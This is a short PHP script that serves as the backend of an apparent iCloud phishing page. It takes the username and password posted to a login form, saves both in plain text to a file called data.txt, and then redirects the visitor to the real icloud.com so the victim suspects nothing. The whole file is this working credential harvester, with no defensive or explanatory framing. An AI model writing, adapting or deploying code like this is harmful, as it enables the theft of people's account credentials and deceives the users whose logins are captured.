<?php
  // Get the form data
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Create a string to save to the file
  $data = "Username: " . $username . "\nPassword: " . $password;

  // Open the file for writing
  $file = fopen("data.txt", "w");

  // Write the data to the file
  fwrite($file, $data);

  // Close the file
  fclose($file);

  // Redirect the user to a thank you page or back to the login page
  header("Location: https://www.icloud.com/?status=success");
?>